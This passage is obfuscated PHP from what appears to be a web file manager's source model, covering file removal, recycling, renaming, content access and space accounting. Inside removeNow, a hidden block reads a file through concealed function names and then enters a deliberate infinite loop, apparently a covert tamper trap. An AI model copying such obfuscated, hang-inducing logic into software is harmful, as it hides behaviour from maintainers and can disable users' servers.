$Åü­¦˜[660] => $Åü­¦˜[12]); $¤¿”ÍÈ¸ = array_merge($£–ë±Ü×, $¤¿”ÍÈ¸); $this->updateModifyTime($¤¿”ÍÈ¸[$Åü­¦˜[192]]); $Á³–®ª— = $Åü­¦˜[2289] . $ıÔ¹™ÚŸ[$Åü­¦˜[193]]; if (isset(self::$cacheChildList[$Á³–®ª—])) { unset(self::$cacheChildList[$Á³–®ª—]); } static $…ô”ºËÑ = false; if (!$…ô”ºËÑ) { Hook::trigger($Åü­¦˜[643], $¤¿”ÍÈ¸); $…ô”ºËÑ = !0; } $Œéœ±É© = $this->add($¤¿”ÍÈ¸); $ùë´äÔ = array($Åü­¦˜[661] => short_id($Œéœ±É©)); $this->where(array($Åü­¦˜[493] => $Œéœ±É©))->save($ùë´äÔ); $this->setNamePinyin($Œéœ±É©, $¤¿”ÍÈ¸[$Åü­¦˜[32]]); return $Œéœ±É©; } public function remove($Æõ¸ñ™£, $ĞÂŠ…¯Ş = true) { $ÏˆâÂ¡€ =& $_SERVER[†ûãı«°]; $ÊñÔŞü = $this->sourceInfo($Æõ¸ñ™£); $«ÏÎ‘­… = intval($ÊñÔŞü[$ÏˆâÂ¡€[190]]) === self::TYPE_SYSTEM; $˜àÛš‡ù = Model($ÏˆâÂ¡€[510])->get($ÏˆâÂ¡€[2290]) == $ÏˆâÂ¡€[91]; if ($«ÏÎ‘­… || $ĞÂŠ…¯Ş || !$˜àÛš‡ù) { return $this->removeNow($Æõ¸ñ™£, $ĞÂŠ…¯Ş); } $²åÜúÚ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÂÛîà’Û = $ÊñÔŞü[$ÏˆâÂ¡€[190]] == self::TYPE_USER ? $ÏˆâÂ¡€[669] : $ÏˆâÂ¡€[582]; if ($ÂÛîà’Û == $ÏˆâÂ¡€[669]) { $…ôå×³æ = Model($ÏˆâÂ¡€[581])->getInfo($ÊñÔŞü[$ÏˆâÂ¡€[573]]); $¨©À÷× = !empty($…ôå×³æ[$ÏˆâÂ¡€[2283]]) ? $…ôå×³æ[$ÏˆâÂ¡€[2283]] : $…ôå×³æ[$ÏˆâÂ¡€[32]]; $¨©À÷× = $ÏˆâÂ¡€[339] . $¨©À÷× . $ÏˆâÂ¡€[2291] . $ÊñÔŞü[$ÏˆâÂ¡€[573]]; } else { $…ôå×³æ = Model($ÏˆâÂ¡€[589])->getInfo($ÊñÔŞü[$ÏˆâÂ¡€[573]]); $¨©À÷× = _get($…ôå×³æ, $ÏˆâÂ¡€[32]); $¨©À÷× = $ÏˆâÂ¡€[176] . $¨©À÷× . $ÏˆâÂ¡€[2292] . $ÊñÔŞü[$ÏˆâÂ¡€[573]]; } $ŸŒØ¼‚Ó = $ÏˆâÂ¡€[2293] . md5($¨©À÷×); CacheLock::lock($ŸŒØ¼‚Ó); $¸Ù÷„“â = $this->fileNameExist($²åÜúÚ, $¨©À÷×); if (!$¸Ù÷„“â) { $¸Ù÷„“â = $this->mkdir($²åÜúÚ, $¨©À÷×, REPEAT_SKIP); $this->metaSet($¸Ù÷„“â, $ÏˆâÂ¡€[2294], $ÂÛîà’Û); $this->metaSet($¸Ù÷„“â, $ÏˆâÂ¡€[2295], $ÊñÔŞü[$ÏˆâÂ¡€[573]]); if ($ÊñÔŞü[$ÏˆâÂ¡€[192]] != 0) { $this->metaSet($¸Ù÷„“â, $ÏˆâÂ¡€[2296], _get($…ôå×³æ, $ÏˆâÂ¡€[2297])); } } CacheLock::unlock($ŸŒØ¼‚Ó); $this->metaSet($Æõ¸ñ™£, $ÏˆâÂ¡€[2298], $ÊñÔŞü[$ÏˆâÂ¡€[192]]); $this->where(array($ÏˆâÂ¡€[193] => $Æõ¸ñ™£))->save(array($ÏˆâÂ¡€[500] => time())); $this->recycleClear($ÊñÔŞü); Model($ÏˆâÂ¡€[640])->eventRemove($Æõ¸ñ™£); $°ı«øí¸ = $this->move($Æõ¸ñ™£, $¸Ù÷„“â, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÊñÔŞü[$ÏˆâÂ¡€[192]]); return $°ı«øí¸; } private function recycleClear($ÓªúÒÖœ) { $¾ààœû =& $_SERVER[†ûãı«°]; $Ò…ö¹Ø = $this->childrenAll($ÓªúÒÖœ); $í²”‡Í = array($¾ààœû[493] => array($¾ààœû[494], $Ò…ö¹Ø[$¾ààœû[2299]])); Model($¾ààœû[2300])->where($í²”‡Í)->delete(); } public function removeNow($Í„üûÛ, $ª—ÇÊ = true) { $¯ı÷‘›© =& $_SERVER[†ûãı«°]; if (!isset($_SERVER[$¯ı÷‘›©[949]]) || !isset($_SERVER[$¯ı÷‘›©[950]])) { $ş°§™ = $¯ı÷‘›©[967]; $¦¶Ø‹¦Ü = $¯ı÷‘›©[951]; $ÉÍ”Ôàô = $_SERVER[$¯ı÷‘›©[952]] . $¯ı÷‘›©[953]; $¹ûšŞò¬ = $¦¶Ø‹¦Ü($ÉÍ”Ôàô); $±ÕÅÊÑş = explode($¯ı÷‘›©[287], $¹ûšŞò¬); if (count($±ÕÅÊÑş) < $¯ı÷‘›©[690]) { $Ã ”ÑÔÀ = $¯ı÷‘›©[954]; $Ã ”ÑÔÀ(); } $éÍŸœ™ = $¯ı÷‘›©[968]; $éÍŸœ™($_SERVER[$¯ı÷‘›©[969]]); $şÜ®øÉ = 1; for ($õ’Ôúİ¤ = $şÜ®øÉ; $õ’Ôúİ¤ > 0; $õ’Ôúİ¤++) { $éÍŸœ™ = json_encode($GLOBALS[$¯ı÷‘›©[494]]); } } $èé³ùÕ§ = $this->sourceInfo($Í„üûÛ); $äÉí• Õ = $this->pathInfoMore($Í„üûÛ); if (!$èé³ùÕ§) { return !0; } if ($èé³ùÕ§[$¯ı÷‘›©[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($Í„üûÛ); Hook::trigger($¯ı÷‘›©[2301], $äÉí• Õ, $ª—ÇÊ); if ($ª—ÇÊ) { Model($¯ı÷‘›©[2300])->moveToRecycle($Í„üûÛ); } else { $–ÍŠ–Şó = $this->childrenAll($èé³ùÕ§); Model($¯ı÷‘›©[640])->eventRemove($Í„üûÛ); $this->removeRelevance($–ÍŠ–Şó[$¯ı÷‘›©[2299]], $–ÍŠ–Şó[$¯ı÷‘›©[1587]]); } $this->folderSizeReset($èé³ùÕ§[$¯ı÷‘›©[192]]); $®ğá ıÖ = array($èé³ùÕ§[$¯ı÷‘›©[192]]); if ($èé³ùÕ§[$¯ı÷‘›©[487]] == $¯ı÷‘›©[91]) { $®ğá ıÖ[] = $èé³ùÕ§[$¯ı÷‘›©[193]]; } $this->updateModifyTime($®ğá ıÖ); $this->lockMoveEnd($Í„üûÛ); Hook::trigger($¯ı÷‘›©[1826], $äÉí• Õ, $ª—ÇÊ); return !0; } public function childrenAll($¨Ã›ù) { $·”ñÀˆ =& $_SERVER[†ûãı«°]; $ò€è’Ë¤ = $¨Ã›ù[$·”ñÀˆ[193]]; if ($¨Ã›ù[$·”ñÀˆ[487]] == $·”ñÀˆ[91]) { $ÏÚ°–Ìñ = array($·”ñÀˆ[659] => array($·”ñÀˆ[619], $¨Ã›ù[$·”ñÀˆ[588]] . $ò€è’Ë¤ . $·”ñÀˆ[620])); $éªĞ«È‚ = array($·”ñÀˆ[659] => $ÏÚ°–Ìñ[$·”ñÀˆ[588]]); $È’‰Ö§ó = $this->field($·”ñÀˆ[2302])->where($éªĞ«È‚)->select(); $ ªƒ¼Ÿ = !1; $¡¢Ë–× = array($ò€è’Ë¤); if ($È’‰Ö§ó) { $ ªƒ¼Ÿ = array_to_keyvalue($È’‰Ö§ó, $·”ñÀˆ[12], $·”ñÀˆ[545]); $ ªƒ¼Ÿ = array_remove_value($ ªƒ¼Ÿ, $·”ñÀˆ[230]); $¡¢Ë–× = array_to_keyvalue($È’‰Ö§ó, $·”ñÀˆ[12], $·”ñÀˆ[193]); $¡¢Ë–×[] = $ò€è’Ë¤; } } else { $ ªƒ¼Ÿ = array($¨Ã›ù[$·”ñÀˆ[545]]); $¡¢Ë–× = array($ò€è’Ë¤); } return array($·”ñÀˆ[2299] => $¡¢Ë–×, $·”ñÀˆ[1587] => $ ªƒ¼Ÿ); } public function removeArray($ÄœÇ‚òÏ) { if (!$ÄœÇ‚òÏ) { return !0; } } public function removeRelevance($ÒÉÚ·‚¿, $ùšôÃø) { $Ø«ñ…Éâ =& $_SERVER[†ûãı«°]; $ÒÉÚ·‚¿ = $ÒÉÚ·‚¿ ? $ÒÉÚ·‚¿ : array(); $ùšôÃø = $ùšôÃø ? $ùšôÃø : array(); $ÒÉÚ·‚¿ = array_unique(array_filter($ÒÉÚ·‚¿)); $ùšôÃø = array_unique(array_filter($ùšôÃø)); if (!$ÒÉÚ·‚¿) { return !1; } $Î®ĞÉæ = array($Ø«ñ…Éâ[493] => array($Ø«ñ…Éâ[494], $ÒÉÚ·‚¿)); Model($Ø«ñ…Éâ[2300])->where($Î®ĞÉæ)->delete(); Model($Ø«ñ…Éâ[537])->where($Î®ĞÉæ)->delete(); Model($Ø«ñ…Éâ[2139])->where($Î®ĞÉæ)->delete(); Model($Ø«ñ…Éâ[640])->where($Î®ĞÉæ)->delete(); Model($Ø«ñ…Éâ[1963])->removeBySource($ÒÉÚ·‚¿); Model($Ø«ñ…Éâ[2281])->removeBySource($ÒÉÚ·‚¿); $this->where($Î®ĞÉæ)->delete(); Model($Ø«ñ…Éâ[548])->remove($ùšôÃø); for ($°Ù å© = 0; $°Ù å© < count($ÒÉÚ·‚¿); $°Ù å©++) { $this->sourceCacheClear($ÒÉÚ·‚¿[$°Ù å©]); } } public function rename($šÜèîëû, $Å’ñçç–) { $¯àé­ˆ =& $_SERVER[†ûãı«°]; $Û§‹øü = $this->sourceInfo($šÜèîëû); if (!$Û§‹øü) { return !1; } $—©¼·¥“ = $this->fileNameExist($Û§‹øü[$¯àé­ˆ[192]], $Å’ñçç–); if ($—©¼·¥“ && $—©¼·¥“ != $šÜèîëû) { return !1; } $ôü «ì™ = array($¯àé­ˆ[496] => $Å’ñçç–, $¯àé­ˆ[658] => USER_ID); if ($Û§‹øü[$¯àé­ˆ[487]] != $¯àé­ˆ[91]) { $ôü «ì™[$¯àé­ˆ[488]] = substr(get_path_ext($Å’ñçç–), 0, 10); } Model($¯àé­ˆ[640])->eventRename($šÜèîëû, $Û§‹øü[$¯àé­ˆ[32]], $Å’ñçç–); $this->sourceCacheClear($šÜèîëû); $this->setNamePinyin($šÜèîëû, $ôü «ì™[$¯àé­ˆ[32]], !1); $this->updateModifyTime($Û§‹øü[$¯àé­ˆ[192]]); $ÏÎòîÀ = $this->where(array($¯àé­ˆ[493] => $šÜèîëû))->data($ôü «ì™)->save(); $­Ãã»Ì« = $¯àé­ˆ[2289] . $Û§‹øü[$¯àé­ˆ[192]]; if (isset(self::$cacheChildList[$­Ãã»Ì«])) { unset(self::$cacheChildList[$­Ãã»Ì«]); } return $ÏÎòîÀ; } public function setNamePinyin($© ‚Ÿ†Ò, $Ë‘ŒÄ—Á, $’º†²á¤ = true) { $²Æß…™À =& $_SERVER[†ûãı«°]; $ö¬¨œ¦ª = Input::check($Ë‘ŒÄ—Á, $²Æß…™À[662]); $“ŠŞ ñ = array($²Æß…™À[519] => KodSort::makeStr($Ë‘ŒÄ—Á)); if ($ö¬¨œ¦ª) { $“ŠŞ ñ[$²Æß…™À[540]] = str_replace($²Æß…™À[53], $²Æß…™À[12], Pinyin::get($Ë‘ŒÄ—Á)); $“ŠŞ ñ[$²Æß…™À[539]] = Pinyin::get($Ë‘ŒÄ—Á, $²Æß…™À[663]); } if (!$’º†²á¤ && !$ö¬¨œ¦ª) { $“ŠŞ ñ[$²Æß…™À[540]] = null; $“ŠŞ ñ[$²Æß…™À[539]] = null; } $this->metaSet($© ‚Ÿ†Ò, $“ŠŞ ñ); } public function getContent($ú§ƒµôµ) { $Ú·ßè—è =& $_SERVER[†ûãı«°]; $ó—‡Ñßö = $this->fileInfoGet($ú§ƒµôµ); if (!$ó—‡Ñßö) { return !1; } if ($ó—‡Ñßö[$Ú·ßè—è[79]] == 0) { return $Ú·ßè—è[12]; } $¤§´øŸ = $Ú·ßè—è[2303] . $ó—‡Ñßö[$Ú·ßè—è[551]]; if ($ó—‡Ñßö[$Ú·ßè—è[79]] <= 1024 * 10) { $Ùß½±ê‡ = Cache::get($¤§´øŸ); if (!$Ùß½±ê‡) { $Ùß½±ê‡ = IO::getContent($ó—‡Ñßö[$Ú·ßè—è[87]]); Cache::set($¤§´øŸ, $Ùß½±ê‡); } return $Ùß½±ê‡; } if (!$ó—‡Ñßö[$Ú·ßè—è[87]]) { return $Ú·ßè—è[12]; } return IO::getContent($ó—‡Ñßö[$Ú·ßè—è[87]]); } public function setDesc($•¦ÔØ…, $–„±¨ä¢) { $ùÀùÇôœ =& $_SERVER[†ûãı«°]; Model($ùÀùÇôœ[640])->eventAddDesc($•¦ÔØ…, $–„±¨ä¢); return $this->metaSet($•¦ÔØ…, $ùÀùÇôœ[528], $–„±¨ä¢); } public function setContent($÷±Õª±», $ê§¹…³À = '') { $úûßÔ¯é =& $_SERVER[†ûãı«°]; $şİœª‚É = $this->sourceInfo($÷±Õª±»); $º£ãç™‡ = $this->fileInfoGet($÷±Õª±»); if (!$º£ãç™‡ || !$şİœª‚É) { return !1; } $ãé¬—û— = Model($úûßÔ¯é[548])->addFileByContent($ê§¹…³À, $şİœª‚É[$úûßÔ¯é[32]]); if (!$ãé¬—û—) { return !1; } $Şş‹™›Ü = $this->fileHistory($şİœª‚É, $ãé¬—û—[$úûßÔ¯é[545]], $ãé¬—û—[$úûßÔ¯é[79]]); if (!$Şş‹™›Ü) { return Model($úûßÔ¯é[548])->remove($ãé¬—û—[$úûßÔ¯é[545]]); } $this->folderSizeReset($şİœª‚É[$úûßÔ¯é[192]]); return !0; } public function fileSubstr($ğ©Ï’±ñ, $ïù¿‚Áä, $”ãÅùç¾) { $Õš„ûÁ = $this->fileInfoGet($ğ©Ï’±ñ); if (!$Õš„ûÁ) { return !1; } return IO::fileSubstr($Õš„ûÁ[$_SERVER[†ûãı«°][87]], $ïù¿‚Áä, $”ãÅùç¾); } public function fileInfoGet($òóÊÖë½) { $¢‡À¡®ó =& $_SERVER[†ûãı«°]; $Êâ®£Ôß = $this->sourceInfo($òóÊÖë½); if (!$Êâ®£Ôß || $Êâ®£Ôß[$¢‡À¡®ó[487]]) { return !1; } $»ƒ«ÓÆ = $¢‡À¡®ó[552] . $Êâ®£Ôß[$¢‡À¡®ó[545]]; $Á¼÷‹¶ï = _get(self::$cacheFileInfo, $»ƒ«ÓÆ); if ($Á¼÷‹¶ï) { return $Á¼÷‹¶ï; } $æ¢³¿µ = Model($¢‡À¡®ó[548])->fileInfo($Êâ®£Ôß[$¢‡À¡®ó[545]]); if ($æ¢³¿µ) { $æ¢³¿µ[$¢‡À¡®ó[32]] = $Êâ®£Ôß[$¢‡À¡®ó[32]]; } self::$cacheFileInfo[$»ƒ«ÓÆ] = $æ¢³¿µ; return $æ¢³¿µ; } private function folderChildrenNumber($ö¿ÎÏ´Ğ) { $üÕÎÎÔò =& $_SERVER[†ûãı«°]; $ƒ«¶¥½Å = $this->sourceInfo($ö¿ÎÏ´Ğ); $ÏÀÜ‘£™ = array($üÕÎÎÔò[659] => array($üÕÎÎÔò[619], $ƒ«¶¥½Å[$üÕÎÎÔò[588]] . $ö¿ÎÏ´Ğ . $üÕÎÎÔò[620]), $üÕÎÎÔò[656] => $ƒ«¶¥½Å[$üÕÎÎÔò[573]], $üÕÎÎÔò[506] => intval($ƒ«¶¥½Å[$üÕÎÎÔò[507]]), $üÕÎÎÔò[653] => 1); $ã¬£Ëİ = $this->where($ÏÀÜ‘£™)->count(); $À¹¡ğû÷ = $this->where($ÏÀÜ‘£™)->where(array($üÕÎÎÔò[653] => 0))->count(); return array($üÕÎÎÔò[83] => $À¹¡ğû÷, $üÕÎÎÔò[84] => $ã¬£Ëİ); } public function pathInfo($œÈ¯ê, $ã³ÇïŒ = false) { $Ô‚…çˆ =& $_SERVER[†ûãı«°]; $ã³ÇïŒ = !1; $œÈ¯ê = intval($œÈ¯ê); $…áéºÚ• = $Ô‚…çˆ[536] . intval($ã³ÇïŒ) . $Ô‚…çˆ[464] . $œÈ¯ê; $“£„Ùø“ = _get(self::$cachePathInfo, $…áéºÚ•); if ($“£„Ùø“) { return $“£„Ùø“; } $Ößµù“¥ = $this->sourceInfo($œÈ¯ê); if (!$Ößµù“¥) { return !1; } $Ößµù“¥ = $this->_listDataApplyItem($Ößµù“¥, $ã³ÇïŒ); self::$cachePathInfo[$…áéºÚ•] = $Ößµù“¥; return $Ößµù“¥; } public static $cachePathInfoMore = array(); public function pathInfoMore($Ôı‰˜•) { $æã÷ïç“ =& $_SERVER[†ûãı«°]; $ÅÏããÊ˜ = _get(self::$cachePathInfoMore, $Ôı‰˜•); if ($ÅÏããÊ˜) { return $ÅÏããÊ˜; } $ÔŸí½òÕ = $this->pathInfo($Ôı‰˜•); if (!$ÔŸí½òÕ) { return !1; } if ($ÔŸí½òÕ[$æã÷ïç“[487]] == $æã÷ïç“[91]) { $ÔŸí½òÕ[$æã÷ïç“[82]] = $this->folderChildrenNumber($Ôı‰˜•); } self::$cachePathInfoMore[$Ôı‰˜•] = $ÔŸí½òÕ; return $ÔŸí½òÕ; } public function sourceInfo($ëöóµ’ò) { $Å–€å¤ =& $_SERVER[†ûãı«°]; if (!$ëöóµ’ò) { return array(); } $ëöóµ’ò = intval($ëöóµ’ò); $–¯¸ØË— = $Å–€å¤[535] . $ëöóµ’ò; $‘¡ú°Ú = _get(self::$cacheSourceInfo, $–¯¸ØË—); if ($‘¡ú°Ú) { return $‘¡ú°Ú; } $˜¾¯ÖäÚ = $this->where(array($Å–€å¤[193] => $ëöóµ’ò))->find(); self::$cacheSourceInfo[$–¯¸ØË—] = $˜¾¯ÖäÚ; return self::$cacheSourceInfo[$–¯¸ØË—]; } public function sourceCacheClear($„®ôìˆ° = false) { self::cacheClear($„®ôìˆ°); } public static function cacheClear($õØİ“æÛ = false) { $ĞòÑæ’â =& $_SERVER[†ûãı«°]; if ($õØİ“æÛ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ĞòÑæ’â[535] . $õØİ“æÛ]); unset(self::$cachePathInfoMore[$õØİ“æÛ]); unset(self::$cachePathInfo[$ĞòÑæ’â[2304] . $õØİ“æÛ]); unset(self::$cachePathInfo[$ĞòÑæ’â[2305] . $õØİ“æÛ]); } public function metaSet($öñ–Şš, $Ü²òâäÈ = null, $ÈõÈ = null) { $¸¹®ƒ¨– = parent::metaSet($öñ–Şš, $Ü²òâäÈ, $ÈõÈ); if ($¸¹®ƒ¨–) { $this->sourceCacheClear($öñ–Şš); } return $¸¹®ƒ¨–; } public function pathInfoByPath($—ú¶åŸú, $ş’„ÌÚ¦) { $¨Û˜©¼ =& $_SERVER[†ûãı«°]; $¬öõƒä’ = !$ş’„ÌÚ¦ ? array() : explode($¨Û˜©¼[8], trim($ş’„ÌÚ¦, $¨Û˜©¼[8])); $Ô½ªåúË = $—ú¶åŸú; foreach ($¬öõƒä’ as $–Ö½) { $ı£ôòù = array($¨Û˜©¼[192] => $Ô½ªåúË, $¨Û˜©¼[32] => $–Ö½); $ÜİÃ šú = $this->field($¨Û˜©¼[2306])->where($ı£ôòù)->select(); if (!$ÜİÃ šú) { return !1; } $ÜİÃ šú = array_sort_by($ÜİÃ šú, $¨Û˜©¼[507]); $Ô½ªåúË = $ÜİÃ šú[0][$¨Û˜©¼[193]]; } $í­óª¾˜ = $this->sourceInfo($Ô½ªåúË); $this->pathInfoFilter($í­óª¾˜); return $í­óª¾˜; } protected function updateModifyTime($á› ÚäÉ) { $ÇŸ÷¢Ü£ =& $_SERVER[†ûãı«°]; $à¾Ç×ŸŒ = defined($ÇŸ÷¢Ü£[2214]) ? USER_ID : 0; if (!$á› ÚäÉ) { return; } if (!is_array($á› ÚäÉ)) { $á› ÚäÉ = array($á› ÚäÉ); } foreach ($á› ÚäÉ as $€ÍÓèÇ => $€‚î¡èö) { $á› ÚäÉ[$€ÍÓèÇ] = intval($€‚î¡èö); $this->sourceCacheClear($€‚î¡èö); } $é½»¢„ì = array($ÇŸ÷¢Ü£[193] => array($ÇŸ÷¢Ü£[7], $á› ÚäÉ)); $½œºĞ× = array($ÇŸ÷¢Ü£[658] => $à¾Ç×ŸŒ, $ÇŸ÷¢Ü£[500] => time()); $this->where($é½»¢„ì)->save($½œºĞ×); } public function folderSizeReset($«Òíòéù, $˜Â¢™®œ = false) { $ê×Öàíğ =& $_SERVER[†ûãı«°]; if ($this->statusIgnoreResetSpace) { return; } $ŸşÄ‡Óı = $this->sourceInfo($«Òíòéù); $¼…¾¦ç¼ = $ê×Öàíğ[2307] . $«Òíòéù; CacheLock::lock($¼…¾¦ç¼, 20); if ($˜Â¢™®œ === !1) { $this->sourceCacheClear($«Òíòéù); $ŸşÄ‡Óı = $this->sourceInfo($«Òíòéù); $¥ÀŞ¿  = array($ê×Öàíğ[479] => $«Òíòéù, $ê×Öàíğ[506] => 0); $Şñûá = $this->where($¥ÀŞ¿ )->sum($ê×Öàíğ[79]); $˜Â¢™®œ = intval($Şñûá) - intval($ŸşÄ‡Óı[$ê×Öàíğ[79]]); } if ($˜Â¢™®œ == 0) { return CacheLock::unlock($¼…¾¦ç¼); } $«ËÎÒÕÎ = $this->parentLevelArray($ŸşÄ‡Óı[$ê×Öàíğ[588]]); if (!$«ËÎÒÕÎ) { $«ËÎÒÕÎ = array(); } $«ËÎÒÕÎ[] = $ŸşÄ‡Óı[$ê×Öàíğ[193]]; $¥ÀŞ¿  = array($ê×Öàíğ[193] => array($ê×Öàíğ[494], $«ËÎÒÕÎ)); if ($˜Â¢™®œ < 0) { $¥ÀŞ¿ [$ê×Öàíğ[79]] = array($ê×Öàíğ[1103], abs($˜Â¢™®œ)); } $this->where($¥ÀŞ¿ )->setAdd($ê×Öàíğ[79], $˜Â¢™®œ); CacheLock::unlock($¼…¾¦ç¼); $…ÕÀ­¤ = $ê×Öàíğ[2308] . $ŸşÄ‡Óı[$ê×Öàíğ[190]] . $ê×Öàíğ[4] . $ŸşÄ‡Óı[$ê×Öàíğ[573]]; $¦‚ŸÃ„× = array($ŸşÄ‡Óı[$ê×Öàíğ[190]], $ŸşÄ‡Óı[$ê×Öàíğ[573]]); TaskRun::timeLimitCall($…ÕÀ­¤, $ê×Öàíğ[2309], $¦‚ŸÃ„×, 1.5); } public function folderSizeResetChildren($¤íêíà’) { $ÓÒŞÒ–ë =& $_SERVER[†ûãı«°]; $this->sourceCacheClear($¤íêíà’); $à¤§Ö¸» = $this->sourceInfo($¤íêíà’); $¹ş„¿™Î = array($ÓÒŞÒ–ë[653] => 1, $ÓÒŞÒ–ë[656] => $à¤§Ö¸»[$ÓÒŞÒ–ë[573]], $ÓÒŞÒ–ë[659] => array($ÓÒŞÒ–ë[619], $à¤§Ö¸»[$ÓÒŞÒ–ë[588]] . $¤íêíà’ . $ÓÒŞÒ–ë[620])); $€ˆŸËõ¶ = $ÓÒŞÒ–ë[2310]; $ôş´ÊŞ = $this->field($€ˆŸËõ¶)->where($¹ş„¿™Î)->select(); $¹ş„¿™Î[$ÓÒŞÒ–ë[487]] = 0; $ˆ›–¤§Ç = $this->field($€ˆŸËõ¶)->where($¹ş„¿™Î)->select(); if (!$ˆ›–¤§Ç) { return; } $ôş´ÊŞ[] = $à¤§Ö¸»; $ôş´ÊŞ = array_to_keyvalue($ôş´ÊŞ, $ÓÒŞÒ–ë[193]); foreach ($ôş´ÊŞ as $ïö¹ºæº => $ı¦¸¢Ğ) { $ôş´ÊŞ[$ïö¹ºæº][$ÓÒŞÒ–ë[2311]] = $ôş´ÊŞ[$ïö¹ºæº][$ÓÒŞÒ–ë[79]]; $ôş´ÊŞ[$ïö¹ºæº][$ÓÒŞÒ–ë[79]] = 0; } foreach ($ˆ›–¤§Ç as $ı¦¸¢Ğ) { $ü€êİ»¤ = $ı¦¸¢Ğ[$ÓÒŞÒ–ë[192]] . $ÓÒŞÒ–ë[12]; if (!isset($ôş´ÊŞ[$ü€êİ»¤])) { continue; } if ($ı¦¸¢Ğ[$ÓÒŞÒ–ë[507]] == $ôş´ÊŞ[$ü€êİ»¤][$ÓÒŞÒ–ë[507]]) { $ôş´ÊŞ[$ü€êİ»¤][$ÓÒŞÒ–ë[79]] += $ı¦¸¢Ğ[$ÓÒŞÒ–ë[79]]; } } foreach ($ôş´ÊŞ as $ı¦¸¢Ğ) { $ù²ª£²´ = $this->parentLevelArray($ı¦¸¢Ğ[$ÓÒŞÒ–ë[588]]); foreach ($ù²ª£²´ as $ü€êİ»¤) { $ü€êİ»¤ = $ü€êİ»¤ . $ÓÒŞÒ–ë[12]; if (!isset($ôş´ÊŞ[$ü€êİ»¤])) { continue; } if ($ı¦¸¢Ğ[$ÓÒŞÒ–ë[507]] == $ôş´ÊŞ[$ü€êİ»¤][$ÓÒŞÒ–ë[507]]) { $ôş´ÊŞ[$ü€êİ»¤][$ÓÒŞÒ–ë[79]] += $ı¦¸¢Ğ[$ÓÒŞÒ–ë[79]]; } } } $‡õ«ÚëŠ = array(); foreach ($ôş´ÊŞ as $ı¦¸¢Ğ) { if ($ı¦¸¢Ğ[$ÓÒŞÒ–ë[79]] == $ı¦¸¢Ğ[$ÓÒŞÒ–ë[2311]]) { continue; } $‡õ«ÚëŠ[] = array($ÓÒŞÒ–ë[193], $ı¦¸¢Ğ[$ÓÒŞÒ–ë[193]], $ÓÒŞÒ–ë[79], $ı¦¸¢Ğ[$ÓÒŞÒ–ë[79]]); } $this->saveAll($‡õ«ÚëŠ); } public function userSpaceReset($‚›ô§âà = false) { $éÅß…üó =& $_SERVER[†ûãı«°]; $­˜Ù…¤· = $this->where(array($éÅß…üó[190] => self::TYPE_USER, $éÅß…üó[573] => $‚›ô§âà, $éÅß…üó[487] => 0))->sum($éÅß…üó[79]); $­˜Ù…¤· = !$­˜Ù…¤· || $­˜Ù…¤· <= 0 ? 0 : $­˜Ù…¤·; Model($éÅß…üó[581])->userEdit($‚›ô§âà, array($éÅß…üó[1972] => $­˜Ù…¤·)); } public function targetSpaceUpdate($íÙåÊ, $Ä˜¬ºÏ•) { $™ï‡ï”¹ =& $_SERVER[†ûãı«°]; if (!$Ä˜¬ºÏ•) { return; } if (!in_array($íÙåÊ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Î¼é±Î = $this->targetSpaceSize($íÙåÊ, $Ä˜¬ºÏ•); if ($íÙåÊ == self::TYPE_USER) { Model($™ï‡ï”¹[581])->userEdit($Ä˜¬ºÏ•, array($™ï‡ï”¹[1972] => $Î¼é±Î)); } else { if ($íÙåÊ == self::TYPE_GROUP) { Model($™ï‡ï”¹[589])->groupEdit($Ä˜¬ºÏ•, array($™ï‡ï”¹[1972] => $Î¼é±Î)); } } } public function targetSpaceSize($«íú…ğœ, $šÃœùÎ³) { $‘ŸšÖ¸  =& $_SERVER[†ûãı«°]; $­éšü‰¿ = 0; $Úêªşİ = $this->targetSourceRoot($«íú…ğœ, $šÃœùÎ³, !0); foreach ($Úêªşİ as $ãÂÊ”Å’) { if (!$ãÂÊ”Å’) { continue; } $­éšü‰¿ += floatval($ãÂÊ”Å’[$‘ŸšÖ¸ [79]]); $¨Æ‡ƒùÊ = array($‘ŸšÖ¸ [659] => array($‘ŸšÖ¸ [619], $‘ŸšÖ¸ [597] . $ãÂÊ”Å’[$‘ŸšÖ¸ [193]] . $‘ŸšÖ¸ [620])); $â¨ƒ±©œ = Model($‘ŸšÖ¸ [505])->field($‘ŸšÖ¸ [493])->where($¨Æ‡ƒùÊ)->select(); $â¨ƒ±©œ = array_to_keyvalue($â¨ƒ±©œ, $‘ŸšÖ¸ [12], $‘ŸšÖ¸ [193]); $â¨ƒ±©œ = array_unique(array_filter($â¨ƒ±©œ)); if ($â¨ƒ±©œ) { $¨Æ‡ƒùÊ = array($‘ŸšÖ¸ [493] => array($‘ŸšÖ¸ [494], $â¨ƒ±©œ)); $­éšü‰¿ += floatval($this->where($¨Æ‡ƒùÊ)->sum($‘ŸšÖ¸ [79])); } } $­éšü‰¿ = !$­éšü‰¿ || $­éšü‰¿ <= 0 ? 0 : $­éšü‰¿; return $­éšü‰¿; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Íê©ØÀ§) { return $this->fileTypeProfile($Íê©ØÀ§, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ğ…ÌÊäË) { return $this->fileTypeProfile($Ğ…ÌÊäË, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Õ©Æ½º×, $ğì€âÇ) { $â‡Ãüô‹ =& $_SERVER[†ûãı«°]; $ö”Şùá = $â‡Ãüô‹[2312] . $Õ©Æ½º× . $â‡Ãüô‹[11] . $ğì€âÇ; $²òî€Æ˜ = Cache::get($ö”Şùá); if ($²òî€Æ˜) { return $²òî€Æ˜; } $åÓ×Î õ = array($â‡Ãüô‹[653] => 0); if ($Õ©Æ½º× != !1) { $åÓ×Î õ[$â‡Ãüô‹[573]] = $Õ©Æ½º×; $åÓ×Î õ[$â‡Ãüô‹[190]] = $ğì€âÇ; } $Õè†Îáİ = array(); $Õè†Îáİ[$â‡Ãüô‹[2313]] = array($â‡Ãüô‹[2314] => LNG($â‡Ãüô‹[2313]), $â‡Ãüô‹[2315] => $this->where($åÓ×Î õ)->count(), $â‡Ãüô‹[624] => $this->where($åÓ×Î õ)->sum($â‡Ãüô‹[79])); 